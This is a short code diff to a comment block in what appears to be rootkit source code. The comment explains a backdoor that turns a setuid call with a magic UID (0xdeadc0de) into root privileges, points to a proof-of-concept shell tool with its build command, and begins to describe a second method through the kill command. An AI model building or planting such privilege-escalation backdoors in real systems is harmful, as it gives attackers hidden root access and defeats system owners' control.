@@ -32,9 +32,10 @@
  *
  * Credential elevation... (3 ways)
  * (1) via setuid intercept:
- *  In your desired program, call `setuid(0xdeadc0de)`. Any other target uid will
- *  function as usual, but this particular target uid will elevate to 0. See
- *  the program in tools/icanhazshell.c for proof of concept.
+ *  In your desired program, call `setuid(EUNUCHS_MAGIC_UID)`. Any other target uid will
+ *  function as usual, but this particular target uid will elevate to 0. By
+ *  default, this value is 0xdeadc0de. 
+ *  See the program in tools/icanhazshell.c for proof of concept.
  *  `gcc -o tools/icanhazshell tools/icanhazshell.c`
  *
  * (2) via kill command:
